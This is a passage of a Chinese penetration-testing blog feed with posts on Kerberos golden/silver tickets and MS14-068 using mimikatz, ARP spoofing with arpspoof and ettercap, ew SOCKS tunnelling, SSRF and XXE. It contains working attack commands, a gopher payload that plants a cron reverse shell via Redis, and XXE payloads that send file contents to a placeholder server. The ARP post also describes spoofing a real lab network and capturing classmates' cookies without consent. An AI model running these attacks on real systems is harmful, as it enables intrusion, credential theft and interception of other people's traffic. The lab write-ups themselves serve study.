用户接收到消息之后，回使用本地的user-secret-key对消息1)进行解密，如果解密成功，说明用户提供的凭证是正确的,此时用户得到了加密后的TGT。第二:从TGS服务器中获取访问权限1. 客户端向TGS服务器发送信息：   1） 第一步骤中的TGT   2） 认证信息（认证符(Authenticator)），包含用户id以及时间戳，通过TGS会话密钥进行加密。2. TGS服务器收到消息之后，会使用TGS密钥对消息1）进行解密,获取到TGS会话密钥，进而对消息2）进行解密，在对用户id以及时间戳进行认证，如果认证成功，向客户端发送消息：   1） client-server-ticket(包含SS会话密钥，用户名信息以及时间戳)，使用ss密钥进行加密   2） ss会话密钥使用TGS会话密钥进行加密3. 客户端收到信息之后会对消息2）进行解密，获得ss会话密钥。第三：访问服务1. 客户端向ss服务器发送以下消息：   1）第二步骤中的client-server-ticket   2）新的Authenticator，包含用户信息，时间戳。通过SS会话密钥进行加密2. SS服务器收到消息之后，会使用ss密钥对消息1）进行解密，解密之后使用ss会话密钥对消息2）解密，解密成功之后会得到authenticator，认证之后，发送：   1）新时间戳，Client发送的时间戳加1，通过ss会话密钥进行加密3. 客户端收到时间戳之后，解密确认，成功之后发送服务请求4. ss服务器收到之后提供服务。</code></pre><h3 id="pass-the-ticket-ptt"><a href="#pass-the-ticket-ptt" class="headerlink" title="pass-the-ticket(ptt)"></a>pass-the-ticket(ptt)</h3><h4 id="黄金票据-Golden-Ticket"><a href="#黄金票据-Golden-Ticket" class="headerlink" title="黄金票据(Golden Ticket)"></a>黄金票据(Golden Ticket)</h4><p>先假设这么一种情况,原先已拿到的域内所有的账户hash,包括krbtgt这个账户,由于有些原因导致域管权限丢失,但好在你还有一个普通域用户权限,碰巧管理员在域内加固时忘记重置krbtgt密码,基于此条件,我们还能利用该票据重新获得域管理员权限,利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz),能够绕过对任意用户的账号策略,让用户成为任意组的成员,可用于Kerberos认证的任何服务</p><p>伪造黄金票据需要以下条件</p><pre><code>krbtgt用户的hash(就意味着你已经有域控制器权限了)域名称域的SID值要伪造的用户名</code></pre><p>获取dc krbtgt用户hash，获取域sid：</p><pre><code>mimikatz# lsadump::lsa /patch </code></pre><p><img src="https://i.imgur.com/mQsDYeD.png"></p><pre><code>mimikatz # kerberos::golden /user:administrator /domain:pentestlab.com /sid:S-1-5-21-2777116530-3322806355-1208541214 /krbtgt:c5535efd632aff3b61143ec34c524d51 /ticket:pentestlab.kirbimimikatz # kerberos::pentestlab.kirbi</code></pre><p><img src="https://i.imgur.com/nYkA1Xc.png"><br><img src="https://i.imgur.com/RWXjfjn.png"></p><p>也可以使用wmiexec远程登录</p><pre><code>wmiexec /shell DCSERVER.PENTESTLAB.COM</code></pre><h4 id="白银票据-Silver-Ticket"><a href="#白银票据-Silver-Ticket" class="headerlink" title="白银票据(Silver Ticket)"></a>白银票据(Silver Ticket)</h4><p>通过观察Kerberos协议的认证过程不难发现,如果我们获取了Server秘钥Ks(服务器口令散列值),就可以跳过KDC的认证，直接伪造票据和目标Server通信</p><pre><code>kerberos::golden /domain:pentestlab.com /sid:S-1-5-21-2777116530-3322806355-1208541214  /target:DMEMBER.pentestlab.com /rc4:34fd2574ccc7b11615bd6378b1799a95  /service:cifs /user:administrator /ptt</code></pre><h4 id="两个票据之间的区别"><a href="#两个票据之间的区别" class="headerlink" title="两个票据之间的区别"></a>两个票据之间的区别</h4><p>访问权限不同</p><pre><code>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限Silver Ticket: 伪造TGS,只能访问指定的服务</code></pre><p>加密方式不同</p><pre><code>Golden Ticket 由Kerberos的Hash加密Silver Ticket 由服务账号(通常为计算机账户)Hash加密</code></pre><p>认证流程不一样</p><pre><code>Golden Ticket 的利用过程需要访问域控,而Silver Ticket不需要</code></pre><h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><pre><code>windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。1. 在请求AS时，将require_PAC设置成False。2. 在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。3. TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT（微软的锅）</code></pre><p>利用过程</p><p>得到普通域用户的sid：</p><pre><code>whoami/user </code></pre><p>执行payload生成ccache：</p><pre><code>MS14-068.exe -u administrator@pentestlab.com -s S-1-5-21-4173655609-916892889-516531421-1108 -d DMEMBER.PENTESTLAB.COM -p A100b200</code></pre><p>使用mimikatz注入凭据</p><pre><code>kerberos::purge #清空当前机器存在的凭证kerberos::ptc c:\downloads\administrator@pentestlab.com.ccache</code></pre><p>(盗图)</p><p><img src="https://i.imgur.com/7bmj1Bt.jpg"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是学到不少东西，有些姿势受限环境复现不成功。内网渗透假期可能会好好研究下，接下来就是准备考试了…本文仅作为总结记录，参考资料文末都已标明。</p><p>参考连接：</p><p><a href="http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</a></p><p><a href="https://www.secpulse.com/archives/65256.html">https://www.secpulse.com/archives/65256.html</a></p><p><a href="https://xz.aliyun.com/t/1943">https://xz.aliyun.com/t/1943</a></p><p><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</a></p><p><a href="https://xz.aliyun.com/t/2205">https://xz.aliyun.com/t/2205</a></p><p><a href="https://xz.aliyun.com/t/1802">https://xz.aliyun.com/t/1802</a></p><p><a href="http://www.vuln.cn/6813">http://www.vuln.cn/6813</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;想想横向移动自己也就只懂msf、IPC啥的打一打，有点菜，总结学习一些横向移动的姿势。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>ARP欺骗</title>
    <link href="https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/"/>
    <id>https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/</id>
    <published>2018-12-28T03:44:14.000Z</published>
    <updated>2019-01-19T02:06:30.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h3><span id="more"></span><p>以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。然而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。</p><h3 id="Arp协议缺陷"><a href="#Arp协议缺陷" class="headerlink" title="Arp协议缺陷"></a>Arp协议缺陷</h3><p>ARP协议信任以太网所有的节点，效率高但是不安全。这份协议没有其它字协议来保证以太网内部信息传输的安全，它不会检查自己是否接受或发送过请求包，只要它就收到的arp广播包，他就会把对应的ip-mac更新到自己的缓存表，说白了就是他信任网络环境内任意通信。</p><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>ARP欺骗分为伪造主机欺骗、伪造网关欺骗、中间人欺骗、ARP泛洪和攻击。</p><p>伪造主机:造成特定主机被认为无响应</p><p>伪造网关:伪造网关，抓取局域网内数据，断网</p><p>中间人欺骗:恶意主机既向网关发送主机数据，又伪造网关像主机发数据，作为中间人可看主机与网关之间交互的数据</p><p>ARP泛洪攻击：利用ARP缓存表支持动态刷新，且是有一定限制的刷多了就把正确的覆盖了，消耗资源</p><h4 id="伪造网关欺骗"><a href="#伪造网关欺骗" class="headerlink" title="伪造网关欺骗"></a>伪造网关欺骗</h4><p>搭建个小环境</p><p><img src="https://i.imgur.com/lDssIx2.png"></p><p>像主机B(10.10.10.133)发送ARP响应包，欺骗主机A(10.10.10.135) kali为网关</p><pre><code>arpspoof -i eth1 -t 10.10.10.133 10.10.10.1</code></pre><p>欺骗前</p><p><img src="https://i.imgur.com/U1V2BNW.png"></p><p>欺骗后</p><p><img src="https://i.imgur.com/jzzdh5j.png"></p><p>可以看到一直是主机B与网关的通信</p><p><img src="https://i.imgur.com/zjjwXsc.png"></p><p>很显然了与网关之间的通信内容也是会被抓窃取。</p><h4 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h4><p><img src="https://i.imgur.com/ufJj1eu.png"></p><p>本机arp缓存表，可以看到从上到下ip依次为本机，网关，安卓手机，kali，现在我利用kali对主机与网关之间通信进行欺骗。</p><p>先打开路由转发(不开启会断网)</p><pre><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forwardarpspoof -i eth0 -t 192.168.31.1 192.168.31.157arpspoof -i eth0 -t 192.168.31.157 192.168.31.1</code></pre><p><img src="https://i.imgur.com/OPGPLLM.png"></p><p>可以看到主机还是可以联网，但是ARP表上网关的MAC地址却是我的kali机，这就意味着我的kali作为中间人可以截获查看主机与网关之间的往来流量。</p><p>kali上打开wireshark抓包</p><p><img src="https://i.imgur.com/tonPwfc.png"></p><p>可以看到主机与网关之间的通信，来往流量被截获和容易抓到一些敏感信息，甚至明文密码cookie。</p><h4 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h4><pre><code>用法Usage: ettercap [OPTIONS] [TARGET1] [TARGET2]用法：ettercap【选项】【目标1】【目标2】TARGET is in the format MAC/IPs/PORTs (see the man for further detail)目标是MAC/IPs/PORTs格式（根据中间人获取更多信息）嗅探与攻击选项：  -M, --mitm &lt;方法:ARGS&gt;  执行mitm攻击  -o, --only-mitm   不嗅探，只执行mitm攻击  -B, --bridge &lt;IFACE&gt; 使用桥接嗅探（需要2个iface——嗅探时使用的网卡接口，嗅探两块网卡之间的数据包）  -p, --nopromisc  不要将iface放入混杂模式  -S, --nosslmitm  不要伪造SSL证书  -u, --unoffensive不要转发数据包  -r, --read &lt;file&gt;   从pcap文件读取数据 &lt;file&gt;  -f, --pcapfilter &lt;string&gt;   设置pcap过滤器&lt;string&gt;  -R, --reversed使用逆向目标反馈  -t, --proto &lt;proto&gt;  只嗅探该proto（默认是全部）用户界面类型：  -T, --text使用只显示字符的界面  -q, --quiet  安静模式，不显示抓到的数据包内容  -s, --script &lt;CMD&gt;向用户界面发出这些命令  -C, --curses   使用curses图形化界面  -G, --gtk使用GTK+ GUI  -D, --daemon守护模式（无界面），相当于在后台运行日志选项：  -w, --write &lt;file&gt;将嗅探到的数据写入pcap文件 &lt;file&gt;  -L, --log &lt;logfile&gt;  此处记录所有流量&lt;logfile&gt;  -l, --log-info &lt;logfile&gt;此处记录所有信息&lt;logfile&gt;  -m, --log-msg &lt;logfile&gt; 此处记录所有消息记录&lt;logfile&gt;  -c, --compress  使用gzip压缩日志文件可视化选项：  -d, --dns   将ip地址解析为主机名  -V, --visual &lt;format&gt;设置可视化格式  -e, --regex &lt;regex&gt;  只实现匹配该regex数据包的可视化  -E, --ext-headers  打印每个pck的扩展头  -Q, --superquiet   不显示用户名与密码通用选项：  -i, --iface &lt;iface&gt; 使用该网络接口  -I, --liface 显示所有的网络接口  -n, --netmask &lt;netmask&gt;在iface上强制实行（force）该&lt;netmask&gt;  -P, --plugin &lt;plugin&gt;   开始该插件&lt;plugin&gt;  -F, --filter &lt;file&gt;   加载过滤器 &lt;file&gt; （内容过滤器）  -z, --silent   不执行初始ARP扫描  -j, --load-hosts &lt;file&gt;  从 &lt;file&gt;加载主机列表  -k, --save-hosts &lt;file&gt;将主机列表保存至&lt;file&gt;  -W, --wep-key &lt;wkey&gt;   使用该wep密钥解密wifi数据包  -a, --config &lt;config&gt;   使用其它配置文件&lt;config&gt;标准选项：  -U,  --update   从ettercap网站更新数据库  -v,  --version   打印此版本并退出  -h,  --help帮助选项</code></pre><h5 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h5><p>修改<code> /etc/ettercap/etter.dns</code><br><img src="https://i.imgur.com/bURzgxS.png"></p><pre><code>ettercap -i eth0 -T -q -P dns_spoof</code></pre><p>可以看到会访问到我kali本地网站</p><p><img src="https://i.imgur.com/6oa7pgy.png"></p><h5 id="中间人-1"><a href="#中间人-1" class="headerlink" title="中间人"></a>中间人</h5><pre><code>ettercap -i eth0 -T -M arp:remote /192.168.31.157// /192.168.31.1//</code></pre><p><img src="https://i.imgur.com/FwikfBS.png"></p><p>主机上网正常，kali也可以捕获过往流量。</p><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>说起上次比赛有老哥跟我说我们路由没做ip/mac绑定，可以arp，当时没研究过这个危害，在实验室兴起，搞了一波用ettercap做了全局域网的欺骗</p><pre><code>ettercap -i eth0 -T -M arp:remote  /192.168.0.1// </code></pre><p><img src="https://i.imgur.com/9kSpCCL.png"></p><p>扫描到五个存货地址，实验室用的一台路由另一个断网了，可以确定102/195为两位小老弟的ip。(仅仅欺骗了几分钟)</p><p><img src="https://i.imgur.com/3gdM1Eb.png"></p><p>可以看到还在认真的学习！！！</p><p><img src="https://i.imgur.com/Oy8OFZq.png"></p><p>却不知自己某站的cookie已经被抓了。</p><h5 id="有需要的！！！改密码-tql"><a href="#有需要的！！！改密码-tql" class="headerlink" title="有需要的！！！改密码 tql"></a>有需要的！！！改密码 tql</h5><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>破坏性的就是断网，危害比较大的就是欺骗后流量被随意抓取，内网抓管理密码，抓http密码。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>局域网内设备要有通信arp表才显示，并且<code>nmap  -sP</code>没有发现安卓设备。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Arp协议&quot;&gt;&lt;a href=&quot;#Arp协议&quot; class=&quot;headerlink&quot; title=&quot;Arp协议&quot;&gt;&lt;/a&gt;Arp协议&lt;/h3&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>ew多级转发</title>
    <link href="https://phyb0x.github.io/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/"/>
    <id>https://phyb0x.github.io/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/</id>
    <published>2018-12-28T03:44:14.000Z</published>
    <updated>2019-01-19T02:06:12.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前用过nc、reGeorg、lcx涉及到的都是一级网络环境，今天看到圈子里发了文章学习记录下。</p><span id="more"></span><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>主要记录下ew在多级网络环境下的使用。这里说下ew穿透成功后，win可以用<a href="http://www.sockscap64.com/" title="SocksCap64">http://www.sockscap64.com</a>，linux用proxychains代理使用。</p><h4 id="一级网络"><a href="#一级网络" class="headerlink" title="一级网络"></a>一级网络</h4><p>普通连接就行了</p><h5 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h5><p>本地机器直接连接靶机(需要靶机有外网)</p><pre><code>ew –s ssocksd –l 888</code></pre><h5 id="反向代理-目标机器没有公网ip，但可访问内部资源"><a href="#反向代理-目标机器没有公网ip，但可访问内部资源" class="headerlink" title="反向代理 (目标机器没有公网ip，但可访问内部资源)"></a>反向代理 (目标机器没有公网ip，但可访问内部资源)</h5><p>vps</p><pre><code>ew -s rcsocks -l 1008 -e 888</code></pre><p>靶机</p><pre><code>ew -s rssocks -d vps:ip -e 888</code></pre><p>linux为例配置proxychains</p><pre><code>vim /etc/proxychains.confsocks5 [攻击者公网IP] 1008proxychains rdesktop [受害者IP]:3389</code></pre><p><img src="https://i.imgur.com/h0f6Gkt.png"></p><p><img src="https://i.imgur.com/Gl5CNxc.png"></p><h4 id="二级网络-一"><a href="#二级网络-一" class="headerlink" title="二级网络(一)"></a>二级网络(一)</h4><p>假设我们有主机A与主机B的权限</p><p><img src="https://i.imgur.com/k3ypgb4.png"></p><p>B主机</p><pre><code>ew -s ssocksd -l 888</code></pre><p>A主机</p><pre><code>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</code></pre><p>该命令意思是将1080端口收到的代理请求转交给B主机（10.48.128.49）的888端口。</p><p>最后可以通过访问A主机外网139.XXX.XX.113:1080来使用在B主机架设的socks5代理。</p><h4 id="二级网络-二"><a href="#二级网络-二" class="headerlink" title="二级网络(二)"></a>二级网络(二)</h4><p>假设我们获得了右侧A主机和B主机的控制权限，A主机没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p><p><img src="https://i.imgur.com/MbtOKv3.png"></p><p>VPS</p><pre><code>ew –s lcx_listen –l 10800 –e 888</code></pre><p>B主机</p><pre><code>ew -s ssocksd -l 999</code></pre><p>A主机</p><pre><code>ew -s lcx_slave -d VPS:ip -e 888 -f 10.48.128.49 -g 999</code></pre><p>将VPS公网的888端口与B主机内网的999端口连接</p><p>最后可以通过访问公网VPS地址 139.XXX.XX.113:10800来使用在B主机架设的socks5代理。</p><h4 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境"></a>三级网络环境</h4><p>右侧内网A主机没有公网IP但可以访问外网，B主机不能访问外网但可以被A主机访问、C主机可被B主机访问而且能够访问核心区域。</p><p><img src="https://i.imgur.com/AFPzsKv.png"></p><p>VPS</p><pre><code>ew -s rcsocks -l 1080 -e 888</code></pre><p>A主机</p><pre><code>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.12 -g 999</code></pre><p>B主机</p><pre><code>ew -s lcx_listen -l 999 -e 777</code></pre><p>C主机</p><pre><code>ew -s rssocks -d 10.48.128.12 -e 777</code></pre><p>在MY PC上可以通过访问公网VPS 139.XXX.XX.113:1080来使用在C主机架设的socks5代理。</p><p>整个数据流向是：SOCKS V5 → 1080 → 888 →999 →777 → rssocks</p><p>直接照搬过来的，理解了其实也不难，就是转来转去中间再搭个桥，主要是能灵活运用。</p><p>参考连接：</p><p><a href="https://www.anquanke.com/post/id/85494">https://www.anquanke.com/post/id/85494</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前用过nc、reGeorg、lcx涉及到的都是一级网络环境，今天看到圈子里发了文章学习记录下。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>SSRF浅析</title>
    <link href="https://phyb0x.github.io/2018/12/25/SSRF%E6%B5%85%E6%9E%90/"/>
    <id>https://phyb0x.github.io/2018/12/25/SSRF%E6%B5%85%E6%9E%90/</id>
    <published>2018-12-25T09:56:00.000Z</published>
    <updated>2019-01-19T02:05:26.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>SSRF利用可以发起网络请求的服务，当做跳板来攻击其他服务。ssrf是穿越防火墙的通行证。(盗图)</p><span id="more"></span><p><a href="http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf">http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf</a></p><p><img src="https://i.imgur.com/Cl76cPU.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用bWAPP靶机进行演示</p><p>首先可以看到language参数可以发起网络请求</p><p><img src="https://i.imgur.com/fYdDSyE.png"></p><h4 id="内网主机端口嗅探"><a href="#内网主机端口嗅探" class="headerlink" title="内网主机端口嗅探"></a>内网主机端口嗅探</h4><p>这里利用的是靶机自带脚本</p><pre><code>&lt;?php/*bWAPP, or a buggy web application, is a free and open source deliberately insecure web application.It helps security enthusiasts, developers and students to discover and to prevent web vulnerabilities.bWAPP covers all major known web vulnerabilities, including all risks from the OWASP Top 10 project!It is for educational purposes only.Enjoy!Malik MesellemTwitter: @MME_IT漏 2013 MME BVBA. All rights reserved.*/echo &quot;&lt;script&gt;alert(\&quot;U 4r3 0wn3d by MME!!!\&quot;);&lt;/script&gt;&quot;;if(isset($_REQUEST[&quot;ip&quot;]))&#123;//list of port numbers to scan$ports = array(21, 22, 23, 25, 53, 80, 110, 1433, 3306);$results = array();foreach($ports as $port)&#123;if($pf = @fsockopen($_REQUEST[&quot;ip&quot;], $port, $err, $err_string, 1))&#123;$results[$port] = true;fclose($pf);&#125;else&#123;$results[$port] = false;&#125;&#125; foreach($results as $port=&gt;$val)&#123;$prot = getservbyport($port,&quot;tcp&quot;);echo &quot;Port $port ($prot): &quot;;if($val)&#123;echo &quot;&lt;span style=\&quot;color:green\&quot;&gt;OK&lt;/span&gt;&lt;br/&gt;&quot;;&#125;else&#123;echo &quot;&lt;span style=\&quot;color:red\&quot;&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;&quot;;&#125;&#125;&#125;?&gt;</code></pre><p><img src="https://i.imgur.com/cyV3zzD.png"></p><h4 id="打内网redis"><a href="#打内网redis" class="headerlink" title="打内网redis"></a>打内网redis</h4><pre><code>http://192.168.233.130/bWAPP/rlfi.php?language=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/xxx.xxx.xxx.xxx/xxx%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  %0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</code></pre><p>不过本地没有利用成功</p><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>利用文件协议读取文件</p><p><img src="https://i.imgur.com/ECRU8kb.png"></p><h4 id="枚举-users-dirs-files"><a href="#枚举-users-dirs-files" class="headerlink" title="枚举(users/dirs/files)"></a>枚举(users/dirs/files)</h4><p>利用burp进行目录枚举，可以用于cms识别，也可以url+paylaod对内网进行攻击。</p><p><img src="https://i.imgur.com/ckIp36X.png"></p><h4 id="Discuz-ssrf-exp"><a href="#Discuz-ssrf-exp" class="headerlink" title="Discuz ssrf exp"></a>Discuz ssrf exp</h4><p><a href="https://phpinfo.me/2017/02/23/1438.html">https://phpinfo.me/2017/02/23/1438.html</a></p><p>更详细的利用</p><p><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a></p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="web功能"><a href="#web功能" class="headerlink" title="web功能"></a>web功能</h4><pre><code>通过URL地址分享网页内容通过url地址加载或下载图片图片文章收藏功能在线翻译：通过url地址翻译对应文本内容未公开的api实现以及其他调用URL的功能</code></pre><h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><pre><code>sharewapurllinksrcsourcetargetu3gdisplaysourceURl    imageURL    domain</code></pre><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><pre><code>http://www.baidu.com@10.10.10.10与http://10.10.10.10 请求是相同的将IP地址转换成二进制</code></pre><p>参考连接：</p><p><a href="https://www.secpulse.com/archives/4747.html">https://www.secpulse.com/archives/4747.html</a></p><p><a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</a></p><p><a href="https://www.freebuf.com/articles/web/20407.html">https://www.freebuf.com/articles/web/20407.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;SSRF&quot;&gt;&lt;a href=&quot;#SSRF&quot; class=&quot;headerlink&quot; title=&quot;SSRF&quot;&gt;&lt;/a&gt;SSRF&lt;/h3&gt;&lt;p&gt;SSRF利用可以发起网络请求的服务，当做跳板来攻击其他服务。ssrf是穿越防火墙的通行证。(盗图)&lt;/p&gt;</summary>
    
    
    
    <category term="基础漏洞总结" scheme="https://phyb0x.github.io/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>xxe浅析</title>
    <link href="https://phyb0x.github.io/2018/12/23/xxe%E6%B5%85%E6%9E%90/"/>
    <id>https://phyb0x.github.io/2018/12/23/xxe%E6%B5%85%E6%9E%90/</id>
    <published>2018-12-23T08:02:44.000Z</published>
    <updated>2019-01-19T02:05:44.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近一个月有点飘，心心念念的驾照说好元旦之前拿下来自己也算是做到了，想着吃顿好的庆祝下，结果把自己牙崩掉了，妈的点丧。马上考试周了，有点难受呀。抓紧着手总结下xxe要不又不知道拖到什么时候了。</p><span id="more"></span><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>xxe也就是xml外部实体注入，libxml2.9.1及以后，默认不解析外部实体，也就是说漏洞利用是有条件的。</p><h3 id="xxe复现利用"><a href="#xxe复现利用" class="headerlink" title="xxe复现利用"></a>xxe复现利用</h3><p>首先测试代码 </p><pre><code>&lt;?php$xml = simplexml_load_string($_POST[&#39;xml&#39;]);echo $xml-&gt;name;?&gt;</code></pre><p>我用的phpstudy PHP5.3 libxml版本为2.7.8 PHP5.5 libxml版本为2.9.4</p><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><p>直接读取</p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///d:/test.txt&quot; &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;</code></pre><p><img src="https://i.imgur.com/D0xf8yq.png"></p><p>(这里面的&amp;一定要换成URL编码%26不然会解析错误//或许是我本地环境问题)</p><p>也可以调用远程文件</p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;%26evil;&lt;/foo&gt;</code></pre><p>远程dtd内容</p><pre><code>&lt;!ENTITY evil SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code></pre><p><img src="https://i.imgur.com/zXbw3af.png"></p><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><p>利用远程服务器上的xml文件进行读取</p><pre><code>&lt;!DOCTYPE updateProfile [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;%dtd;%send;]&gt;</code></pre><p>远程文件内容</p><pre><code>&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://xxx.xxx.xxx/?data=%file;&#39;&gt;&quot;&gt;%all;</code></pre><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;%26xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>PHP下需要expect扩展，没环境就不演示了。</p><h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;%26xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p><img src="https://i.imgur.com/iI191PR.png"></p><p>也可以url+payload直接打内网</p><p>参考连接：</p><p><a 